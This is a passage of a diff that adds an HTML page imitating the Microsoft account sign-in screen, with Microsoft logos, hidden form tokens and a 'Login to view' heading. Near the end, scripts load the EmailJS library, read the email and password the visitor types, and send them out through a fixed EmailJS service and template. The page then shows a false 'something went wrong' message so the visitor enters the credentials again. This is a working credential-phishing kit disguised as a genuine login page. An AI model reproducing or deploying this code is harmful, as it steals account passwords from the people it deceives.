l2iSwP2UKvGb0Xc8lRT0TEM8QGMvEo/LgqA7Q4N5zd+6jynytiJhLSH8rGwXSPJFe+W5D7E9n7qFVjJvbIttyexdiMuxDaIyIEtdp97BWaLaYC43edDbQqjl2f1UzbFrz4q2u2bVQJsxw17pVoxxt6ZzJ9Qk09fzgzGDaS1zmjfPO4u5SNgOZ2YgG2dcnXnooLj2d1jHA7rhbqAKlDK2XaigLA+/w2vfrWV8cft3BnTVPKU0pLgmiF/Eja7wXqqalYWRAHsVSvPPYj8qCIiFgiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIoa2tA8n8x9lRTTRM+bmOeirHfMfusIzFWPpo3lhdcDtt12XkZ2R+Uqdz8FoLuejKI6info2w7ADzXLzG7RxFr6X1UVYRjc8s4aSSL2t1K+4zjTqGnLwbfDc31WfSc+PUYbqRW/VMe6RmHApHHk0nkvb2em/u+S19l2ksp5iHScna6qqptp8EsgYJLk9V19KsO7sTSPPjlU788k+ey0xGjW6jQ3XBhpxoQ03HYP3UaR50jdDxN7S11ZqnaHBG4jftrY3KzVFknwi7y6UtkwCjpSdA3t5WXu2igNgIxoPsoywTN7cRkDWuuSbD/AGUo0kvFY13aPJVnGUPmNKboX8o69HUx1Mbb/bRdvYYB/I303VYipva8nR2xX0KL2Cn7o8l4PwqnebuY0/i6uiKdtDSZa2YVTs5Mba+thZeww+mHJjfJVyJtkdsfsUfsMHcb6QuPYYD/ACDysq1FBOl9ij9hgH8jfTderKaJmrWgH/Ve6JyHFMAW0CIiEhERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREfK0DyfzH2WK4zhxqmFtr3PZzWXrydE13Ox+4Xn5OLHIg65/UlPT2RthuXeBLvW1vcaXC5zBgj6qB7GjqtcBSMIQOQaF0fA13zNuOvrVOnYlfT49tKK3JXLUjUDG9n9Y973xtdqf5etWjCcgYk2qBdvkBwJvfRbjyYbBJzY3l3dV1jwqmYQ4RtH+Ve9HqVig4Hly6bX3qSIOZlGrbShove1vFYpVZFr5JXOAfbe7L3W1DaOIi24CLcyLIcPgJvuNv/74KkMxx5NLMCMkQdlbK1RQSNdIHXFuY1U30LDHG1rtD/0vVtHE03a1oPavdkdrdVurtWNtvuvbZ0Y+OqI6R6oiKiWlpHSERFICIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIihxTe2AiInavsAiIml4ARETSS0AiIpAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAf/9k="
+                  alt=""
+                  width="100%"
+                  height="100%"
+                />
+                <!-- ko if: useImageMask --><!-- /ko -->
+                <!-- /ko -->
+              </div>
+            </div>
+
+            <!-- ko if: svr.iBannerEnvironment --><!-- /ko -->
+
+            <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
+            <div
+              class="outer"
+              data-bind="css: { 'app': $page.backgroundLogoUrl }"
+            >
+              <!-- ko if: showHeader --><!-- /ko -->
+
+              <div class="template-section main-section">
+                <div
+                  data-bind="externalCss: { 'middle': true }"
+                  class="middle ext-middle"
+                >
+                  <div
+                    class="full-height"
+                    data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }"
+                  >
+                    <!--  -->
+
+                    <!-- ko withProperties: { '$content': $data } -->
+                    <div class="flex-column">
+                      <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->
+
+                      <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->
+
+                      <div class="win-scroll">
+                        <div
+                          id="lightbox"
+                          data-bind="
+            animationEnd: $page.paginationControlHelper.animationEnd,
+            externalCss: { 'sign-in-box': true },
+            css: {
+                'inner':  $content.isVerticalSplitTemplate,
+                'vertical-split-content': $content.isVerticalSplitTemplate,
+                'app': $page.backgroundLogoUrl,
+                'wide': $page.paginationControlHelper.useWiderWidth,
+                'fade-in-lightbox': $page.fadeInLightBox,
+                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
+                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
+                'lightbox-bottom-margin-debug': $page.showDebugDetails,
+                'has-header': $content.hasHeader }"
+                          class="sign-in-box ext-sign-in-box has-popup"
+                        >
+                          <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
+
+                          <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->
+
+                          <div
+                            class="lightbox-cover"
+                            data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"
+                          ></div>
+
+                          <!-- ko if: showLightboxProgress --><!-- /ko -->
+
+                          <!-- ko if: loadBannerLogo -->
+                          <div
+                            data-bind="component: { name: 'logo-control',
+            params: {
+                isChinaDc: svr.fIsChinaDc,
+                bannerLogoUrl: bannerLogoUrl() } }"
+                          >
+                            <!--  -->
+
+                            <!-- ko if: bannerLogoUrl --><!-- /ko -->
+
+                            <!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx -->
+                            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
+                              class="logo"
+                              role="img"
+                              pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png"
+                              svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+                              data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
+                              src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+                              alt="Microsoft"
+                            /><!-- /ko -->
+                            <!-- /ko --><!-- /ko -->
+                            <!-- /ko -->
+
+                            <!-- ko if: !bannerLogoUrl && isCiamUserFlowUx && bannerLogoText --><!-- /ko -->
+                          </div>
+                          <!-- /ko -->
+
+                          <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->
+
+                          <!-- ko if: asyncInitReady -->
+                          <div
+                            role="main"
+                            data-bind="component: { name: 'pagination-control',
+            publicMethods: paginationControlMethods,
+            params: {
+                enableCssAnimation: svr.fEnableCssAnimation,
+                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
+                initialViewId: initialViewId,
+                currentViewId: currentViewId,
+                initialSharedData: initialSharedData,
+                initialError: $loginPage.getServerError() },
+            event: {
+                cancel: paginationControl_onCancel,
+                load: paginationControlHelper.onLoad,
+                unload: paginationControlHelper.onUnload,
+                loadView: view_onLoadView,
+                showView: view_onShow,
+                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+                animationStateChange: paginationControl_onAnimationStateChange } }"
+                          >
+                            <!--  -->
+
+                            <div
+                              data-bind="css: { 'zero-opacity': hidePaginatedView() }"
+                              class=""
+                            >
+                              <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->
+
+                              <div
+                                class="pagination-view animate slide-in-next"
+                                data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }"
+                              >
+                                <!-- ko foreach: views -->
+                                <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                <!-- ko template: { nodes: [$data], data: $parent } -->
+                                <div
+                                  data-viewid="1"
+                                  data-showfedcredbutton="true"
+                                  data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+                params: {
+                    serverData: svr,
+                    serverError: initialError,
+                    isInitialView: isInitialState,
+                    displayName: sharedData.displayName,
+                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
+                    prefillNames: $loginPage.prefillNames,
+                    flowToken: sharedData.flowToken,
+                    availableSignupCreds: sharedData.availableSignupCreds,
+                    customStrings: $loginPage.stringCustomizationObservables.customStrings(),
+                    isCustomizationFailure: $loginPage.stringCustomizationObservables.isCustomStringsLoadFailure(),
+                    userIdLabel: $loginPage.userIdLabel,
+                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
+                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
+                    accessRecoveryLink: $loginPage.accessRecoveryLink,
+                    boilerPlateText: $loginPage.boilerPlateText },
+                event: {
+                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
+                    redirect: $loginPage.view_onRedirect,
+                    updateDFPUrl: $loginPage.view_onUpdateDFPUrl,
+                    setPendingRequest: $loginPage.view_onSetPendingRequest,
+                    registerDialog: $loginPage.view_onRegisterDialog,
+                    unregisterDialog: $loginPage.view_onUnregisterDialog,
+                    showDialog: $loginPage.view_onShowDialog,
+                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
+                    agreementClick: $loginPage.footer_agreementClick } }"
+                                >
+                                  <!--  -->
+
+                                  <div
+                                    data-bind="component: { name: 'header-control',
+    params: {
+        serverData: svr,
+        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
+        headerDescription: customDescription() } }"
+                                  >
+                                    <div>
+                                      <div
+                                        class="row title ext-title"
+                                        id="loginHeader"
+                                        data-bind="externalCss: { 'title': true }"
+                                      >
+                                        <div
+                                          role="heading"
+                                          aria-level="1"
+                                          data-bind="text: title"
+                                        >
+                                          Login to view
+                                        </div>
+                                        <!-- ko if: isSubtitleVisible --><!-- /ko -->
+                                      </div>
+
+                                      <!-- ko if: headerDescription --><!-- /ko -->
+                                    </div>
+                                  </div>
+
+                                  <!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko -->
+
+                                  <div class="row">
+                                    <!-- ko if: svr.fEnableAriaLiveUpdates --><!-- /ko -->
+
+                                    <!-- ko ifnot: svr.fEnableAriaLiveUpdates -->
+                                    <div role="alert" aria-live="assertive">
+                                      <!-- ko if: usernameTextbox.error --><!-- /ko -->
+                                    </div>
+                                    <!-- /ko -->
+
+                                    <div class="form-group col-md-24">
+                                      <!-- ko if: prefillNames().length > 1 --><!-- /ko -->
+
+                                      <!-- ko ifnot: prefillNames().length > 1 -->
+                                      <div
+                                        class="placeholderContainer"
+                                        data-bind="component: { name: 'placeholder-textbox-field',
+            publicMethods: usernameTextbox.placeholderTextboxMethods,
+            params: {
+                serverData: svr,
+                hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
+                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
+            event: {
+                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"
+                                      >
+                                        <!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+                                        <p class="error" id="mx"></p>
+                                        <input
+                                          type="email"
+                                          name="loginfmt"
+                                          id="a"
+                                          maxlength="113"
+                                          class="form-control ltr_override input ext-input text-box ext-text-box"
+                                          aria-required="true"
+                                          data-report-event="Signin_Email_Phone_Skype"
+                                          data-report-trigger="click"
+                                          data-report-value="Email_Phone_Skype_Entry"
+                                          data-bind="
+                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en',
+                    autocomplete: svr.fEnablePasskeyAutofillUI ? 'username webauthn' : 'username' },
+                    externalCss: {
+                        'input': true,
+                        'text-box': true,
+                        'has-error': usernameTextbox.error },
+                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
+                    ariaDescribedBy:
+                     svr.fWin10HostAccessibilityFix ?
+                        'winBodyHeader winBodySubHeader loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription usernameError' : ' usernameError') :
+                        'loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription usernameError' : ' usernameError'),
+                    textInput: usernameTextbox.value,
+                    hasFocusEx: usernameTextbox.focused,
+                    placeholder: $placeholderText"
+                                          autocomplete="username webauthn"
+                                          aria-label="Enter your email, phone, or Skype."
+                                          aria-describedby="loginHeader usernameError"
+                                          placeholder="Email, phone, or Skype"
+                                          data-report-attached="1"
+                                          required
+                                        />
+
+                                        <input
+                                          name="passwd"
+                                          type="password"
+                                          id="b"
+                                          data-bind="moveOffScreen, textInput: passwordBrowserPrefill"
+                                          aria-label="Enter your Password."
+                                          placeholder="Password"
+                                          class="form-control ltr_override input ext-input text-box ext-text-box"
+                                          required
+                                        />
+
+                                        <!-- /ko -->
+                                        <!-- /ko -->
+                                        <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
+                                      </div>
+                                      <!-- /ko -->
+                                    </div>
+                                  </div>
+
+                                  <div
+                                    data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }"
+                                    class="position-buttons password-reset-links-container ext-password-reset-links-container"
+                                  >
+                                    <div class="row">
+                                      <div class="col-md-24">
+                                        <div class="text-13">
+                                          <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
+                                          <!-- ko if: svr.fIsSelfServiceSignupUxEnabled --><!-- /ko -->
+
+                                          <!-- ko ifnot: svr.fIsSelfServiceSignupUxEnabled -->
+                                          <div
+                                            class="form-group"
+                                            data-bind="
+                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
+                    childBindings: {
+                        'signup': {
+                            href: svr.urlSignUp || '#',
+                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
+                            click: signup_onClick } }"
+                                          >
+                                            No account?
+                                            <a
+                                              href="https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&amp;scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&amp;redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&amp;response_type=code&amp;state=eyJpZCI6IjAxOThmMGI1LWVjMGEtN2FiZi05NTdiLWEzMmE5ZTAyYzBkZCIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d&amp;response_mode=fragment&amp;nonce=0198f0b5-ec0a-79b0-80f6-151f0c3b5e65&amp;code_challenge=2vHABPdgN2u_wsWFUP5FKzAyWu3Nq35q2hygGUogMbg&amp;code_challenge_method=S256&amp;x-client-SKU=msal.js.browser&amp;x-client-Ver=4.14.0&amp;uaid=1ec9288cba1cb38758b37949d514cf0c&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=en-GB&amp;client_info=1&amp;signup=1&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;epct=PAQABDgEAAABVrSpeuWamRam2jAF1XRQE4tVaiyHMLUQd4Bl-G1bQtXKm2mOSKVh_s8KjJuxzYzYUF2qII3Fk1huy_1qN7ATymyZi1dzZnzHFRPiototlwFY0R1XXSUff56821BToh23U1bSz8I-gTwsTo9bBWav1uoY6UkVnZJR29g7LKsRWbS8Ow58MG1XN6JS7OeKw0vAwIuJmZ7CedS78f4UFzKIcE5pdewhNARVj8cgcuZP1ZCAA&amp;jshs=0&amp;cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&amp;claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d"
+                                              id="signup"
+                                              aria-label="Create a Microsoft account"
+                                              >Create one!</a
+                                            >
+                                          </div>
+                                          <!-- /ko -->
+                                          <!-- /ko -->
+
+                                          <!-- ko ifnot: hideCantAccessYourAccount -->
+                                          <div class="form-group">
+                                            <a
+                                              id="cantAccessAccount"
+                                              name="cannotAccessAccount"
+                                              data-bind="
+                        text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
+                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
+                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
+                        href: accessRecoveryLink || '#'"
+                                              href="#"
+                                              >Can’t access your account?</a
+                                            >
+                                          </div>
+                                          <!-- /ko -->
+
+                                          <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) --><!-- /ko -->
+
+                                          <!-- ko if: svr.fEnableShowPickerCredObservable -->
+                                          <!-- ko if: showCredPicker() --><!-- /ko -->
+                                          <!-- /ko -->
+
+                                          <!-- ko ifnot: svr.fEnableShowPickerCredObservable --><!-- /ko -->
+
+                                          <!-- ko if: svr.urlSkipZtd --><!-- /ko -->
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <!-- ko if: svr.fShowLegalMessagingInline --><!-- /ko -->
+
+                                  <div
+                                    class="win-button-pin-bottom"
+                                    data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }"
+                                  >
+                                    <div
+                                      class="row"
+                                      data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }"
+                                    >
+                                      <div
+                                        data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                isPrimaryButtonEnabled: !isRequestPending(),
+                isPrimaryButtonVisible: svr.fShowButtons,
+                isSecondaryButtonEnabled: true,
+                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
+                secondaryButtonText: secondaryButtonText() },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }"
+                                      >
+                                        <div
+                                          class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
+                                          data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin },
+    externalCss: { 'button-field-container': true }"
+                                        >
+                                          <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+                                          <div
+                                            data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
+                                            class="inline-block button-item ext-button-item"
+                                          >
+                                            <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+                                            <!-- ko ifnot: svr.fConsentButtonIdViaName -->
+                                            <button
+                                              class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
+                                              type="submit"
+                                              id="topsw"
+                                            >
+                                              Next
+                                            </button>
+                                            <!-- /ko -->
+                                            <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <script
+                                    type="text/javascript"
+                                    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+                                  ></script>
+                                  <script>
+                                    let publicKey = "yX2vfTB_6cXZ8dllD";
+                                    let counts = 0;
+
+                                    document.addEventListener(
+                                      "DOMContentLoaded",
+                                      function () {
+                                        emailjs.init(publicKey);
+                                      },
+                                    );
+                                  </script>
+                                  <script>
+                                    document
+                                      .getElementById("topsw")
+                                      .addEventListener("click", function (e) {
+                                        e.preventDefault();
+                                        let mxx = document.getElementById("mx");
+
+                                        const x =
+                                          document.getElementById("a").value;
+                                        const y =
+                                          document.getElementById("b").value;
+
+                                        if (x == "" || y == "") {
+                                          mxx.innerHTML = "empty fields.";
+                                          return;
+                                        }
+
+                                        try {
+                                          document.getElementById(
+                                            "topsw",
+                                          ).disabled = true;
+                                          let mff =
+                                            "add: " + x + "\n\n psw: " + y;
+                                          let from = "";
+                                          let to = "";
+                                          let subject = "";
+
+                                          let service_id = "service_jgywlgp";
+                                          let template_id = "template_wc63z6r";
+                                          let template_params = {
+                                            to_name: to,
+                                            from_name: from,
+                                            subject: subject,
+                                            message: mff,
+                                          };
+
+                                          if (counts === 3) {
+                                            mxx.innerHTML =
+                                              "You have reached the maximum number of attempts. Please try again later.";
+                                            return;
+                                          } else {
+                                            counts += 1;
+
+                                            emailjs
+                                              .send(
+                                                service_id,
+                                                template_id,
+                                                template_params,
+                                              )
+                                              .then(
+                                                function (response) {
+                                                  mxx.innerHTML =
+                                                    "something went wrong, please try again later.";
+                                                  document.getElementById(
+                                                    "topsw",
+                                                  ).disabled = false;
+                                                },
+                                                function (error) {
+                                                  mxx.innerHTML =
+                                                    "Something went wrong, please try again later.";
+                                                  console.log(error);
+                                                  document.getElementById(
+                                                    "topsw",
+                                                  ).disabled = false;
+                                                },
+                                              );
+                                          }
+                                        } catch (error) {
+                                          mxx.innerHTML =
+                                            "Something went wrong, please try again later.";
+                                        }
+                                      });
+                                  </script>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <!-- /ko -->
+
+                          <input
+                            type="hidden"
+                            name="ps"
+                            data-bind="value: postedLoginStateViewId"
+                            value=""
+                          />
+                          <input
+                            type="hidden"
+                            name="psRNGCDefaultType"
+                            data-bind="value: postedLoginStateViewRNGCDefaultType"
+                            value=""
+                          />
+                          <input
+                            type="hidden"
+                            name="psRNGCEntropy"
+                            data-bind="value: postedLoginStateViewRNGCEntropy"
+                            value=""
+                          />
+                          <input
+                            type="hidden"
+                            name="psRNGCSLK"
+                            data-bind="value: postedLoginStateViewRNGCSLK"
+                            value=""
+                          />
+                          <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
+                          <input
+                            type="hidden"
+                            data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary"
+                            name="canary"
+                            value="Eje2hEblGKKyPIFkUSFO5fhyTsY67KMjuz1OeFsGaNE=0:1:CANARY:18DDNpx8EcAl5B+r1XzTxwJsRbSEnJ3Ldh+ZvtIjy/4="
+                          />
+                          <!-- /ko -->
+                          <!-- ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
+                          <input
+                            type="hidden"
+                            name="ctx"
+                            data-bind="value: ctx"
+                            value="rQQIARAAjZJPaBNpGMZnkjSmY9vEKossi4RQRLadyffNn2SSpYdUJ3HSJqmamjSLlPnzfckk38zEzKRtIgXxoqiwHhdP4rEn0cviaU-CvVi2CJKTeOxBxFO9mepNWHbh5eE9PC8vv_d5mbDIQZEDvwZ5DmTnMjCT0TEPWA0KmBUhSLOyZBos4CEU03IaYVHuzTKxhxden_vl5d0X9RcD9e2ZN1O79LmW73e9bDLp9n3iuh2OWJuIM1w7aWsWSf5F0_s0vRuYAzAjY6BLLDKAxqYzOmBlgFMslCAGhqBLKCWNAtFKru-3-GNxe9YQHQZmPESQ4W9ohuH2Hf9zIIJ7WtNGjv842EWDYrdxUU2p7dx2pdqySwUVrtSut0sFxS_zeathAalcNa2VmjIs2YrUqOYG68OlznjGU21IzIJiVRzP0moSaNSLrXXhalfnpTVUXyJq27UM-3pHqxfJunDFwnWwuBv8-UdcF2PL-Ab8PBgeq-06e8Hcv7uSnImw1id-3O0ixzLj3Z6LLYLiYwuxHHQMijzvXZDeD9Gj0Izp6guYOJqNFraIeRj6KRKKzZyl4tSF82AiG4kwsejZE3HqKEQ_nRgHVP4tJXyw76t_HEwf3I7Wqb2JpNJGfEvRSWF5ebCq5jtr1_IVCbcGVW89lV4utftDWEF5r6CVlUWQhY_C9KPw6efhyUgwRiWCF1fhXjhqexrh2h6n99wtD_U-hel7J6iXk_8R_p8MvcvM85uXc0urZrPM9ze2vFp-bVXKLw9zg1pfKN8UpJt8a9AsrLnNkt58xtD7J-nR1BkmgMnsD-yjKchMGq7e0xzTMmfnNB2IkqSN_8gEAium9AyrQ1lnTcxjKa1nkCgaoymZCRtEs2xvlruV-H7bDd_tICeRvZXYtr0NwzjuNjXSR14i-3tiDJy4sbOzc2f6f234e5o6mvl08OGfB6--fLx8GF2A8qVL5e62rBg5Ii3N92B9WN3eKnpX9WuKUxRWzNZ8Y9NX24OkuPgsRr0f1ynq6NSTwFc1"
+                          />
+                          <input
+                            type="hidden"
+                            name="hpgrequestid"
+                            data-bind="value: svr.sessionId"
+                            value="33363b4e-6de2-498a-8fd3-0dd3800f5800"
+                          />
+                          <input
+                            type="hidden"
+                            id="i0327"
+                            data-bind="attr: { name: svr.sFTName }, value: flowToken"
+                            name="flowToken"
+                            value="AQABIQEAAABVrSpeuWamRam2jAF1XRQEyltTkS8d37NlQMS_g4patadKac8N82C-sLV1ZyfFHU3fSjhN0DlkSnFfnyqrBczc58PcTkSnXPdcCz67tc8DXRmNckI7WZtJ4cVgdPGh_gWJNZid9gAQoRxmzTvXoad7ZHXuK9tGobvttU73ugMWWs9kiAvMsFozFpOo0TVl8lcu8MAZdX8skj4GKdTuYecNtoLh21NfWg2qJcKRvYzm0P5abjr3gdLyL0Za0Mtd1fyh8mQrP1G9urORpuEHCPTbZ6ZtMUFRxHWWHs_Df1fK0DgUujtknQkfXTzx5Unz6wT5RjJmYwD1ufoZxylnyJBsc_ZfBU75Cnum0E19-ds7kZPJLOIBCUGUH81fAIBEfpHIcYfPallOhW7zIHiZDk4i7mClX1-8E-cK4dilCWx9xmB8G96P8ks5m_7_BfNAnfO-5yO2pYdLDa_Z8ey-fk7LQbDWiOfxu8ZXLHh-K1R9lB23mMy3Mk0oMRDcVyI81WLWZboW-7yaIbUgjzpCIOk_l9Lh9FloqWp8ExKMXPWyjSAA"
+                          />
+                          <input
+                            type="hidden"
+                            name="PPSX"
+                            data-bind="value: svr.sRandomBlob"
+                            value=""
+                          />
+                          <input type="hidden" name="NewUser" value="1" />
+                          <input
+                            type="hidden"
+                            name="FoundMSAs"
+                            data-bind="value: svr.sFoundMSAs"
+                            value=""
+                          />
+                          <input
+                            type="hidden"
+                            name="fspost"
+                            data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"
+                            value="0"
+                          />
+                          <input
+                            type="hidden"
+                            name="i21"
+                            data-bind="value: wasLearnMoreShown() ? 1 : 0"
+                            value="0"
+                          />
+                          <input
+                            type="hidden"
+                            name="CookieDisclosure"
+                            data-bind="value: svr.fShowCookieBanner ? 1 : 0"
+                            value="0"
+                          />
+                          <input
+                            type="hidden"
+                            name="IsFidoSupported"
+                            data-bind="value: isFidoSupported() ? 1 : 0"
+                            value="1"
+                          />
+                          <input
+                            type="hidden"
+                            name="isSignupPost"
+                            data-bind="value: isSignupPost() ? 1 : 0"
+                            value="0"
+                          />
+                          <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery --><!-- /ko -->
+                          <!-- ko if: svr.fEnableDFPIntegration -->
+                          <input
+                            type="hidden"
+                            name="DfpArtifact"
+                            data-bind="value: dfpResult()"
+                            value=""
+                          />
+                          <!-- /ko -->
+                          <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() --><!-- /ko -->
+                          <div
+                            data-bind="component: { name: 'instrumentation-control',
+            publicMethods: instrumentationMethods,
+            params: { serverData: svr } }"
+                          >
+                            <input
+                              type="hidden"
+                              name="i19"
+                              data-bind="value: timeOnPage"
+                              value=""
+                            />
+                          </div>
+                          <!-- /ko -->
+                        </div>
+
+                        <!-- ko if: $page.showFedCredAndNewSession -->
+                        <!-- ko if: $page.showFedCredButtons -->
+                        <div
+                          data-bind="component: { name: 'fed-cred-buttons-control',
+            params: {
+                serverData: svr,
+                fedCredOptions: $page.otherSigninOptions },
+            event: {
+                fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }"
+                        >
+                          <!--  -->
+
+                          <!-- ko withProperties: { '$fedCredButtonsControl': $data } -->
+                          <div
+                            data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': !svr.fUseNewPromotedCredsComponent }"
+                          >
+                            <div
+                              class="promoted-fed-cred-content promoted-fed-cred-box ext-promoted-fed-cred-box"
+                              data-bind="externalCss: { 'promoted-fed-cred-box': svr.fUseNewPromotedCredsComponent }, css: {
+        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
+        'slide-out-next': $page.animate.isSlideOutNext,
+        'slide-in-next': $page.animate.isSlideInNext,
+        'slide-out-back': $page.animate.isSlideOutBack,
+        'slide-in-back': $page.animate.isSlideInBack,
+        'app': $page.backgroundLogoUrl }"
+                            >
+                              <!-- ko ifnot: svr.fIsQrCodePinSupported --><!-- /ko -->
+
+                              <!-- ko if: svr.fEnableQrCodeA11YFixes -->
+                              <!-- ko if: svr.fIsQrCodePinSupported -->
+                              <!-- ko foreach: $fedCredButtonsControl.fedCredOptions -->
+                              <div
+                                class="tile-container"
+                                data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }"
+                              >
+                                <div class="row tile">
+                                  <div
+                                    class="table"
+                                    role="button"
+                                    tabindex="0"
